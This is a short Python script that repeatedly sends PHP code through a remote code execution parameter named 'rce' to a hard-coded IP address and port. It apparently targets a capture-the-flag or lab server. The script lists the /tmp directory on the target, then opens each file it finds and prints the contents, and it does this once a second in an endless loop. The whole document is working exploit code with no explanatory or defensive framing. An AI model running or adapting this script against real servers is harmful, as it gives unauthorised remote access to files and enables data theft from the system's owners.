import requests
import time


while True:
    url = "http://54.177.207.109:23333/"
    x = {"rce":"var_dump(scandir('/tmp'));"}
    x = requests.post(url=url, data=x)
    rrr = x.text
    print(rrr)
    x = """$files = scandir('/tmp');
        if(count($files) > 2) {
            foreach ($files as $key => $value) {            
                echo '<pre>\n'; print_r($value); echo '</pre>';
                // to read files data
                $readFileVar = fopen ($value, "rb");
                while ($filedata = fgets($readFileVar)) { 
                    print_r($filedata);
                }
            }
        }"""
    data = {"rce":x}
    x = requests.post(url=url, data=data)
    rrr = x.text
    print(rrr)
    time.sleep(1)
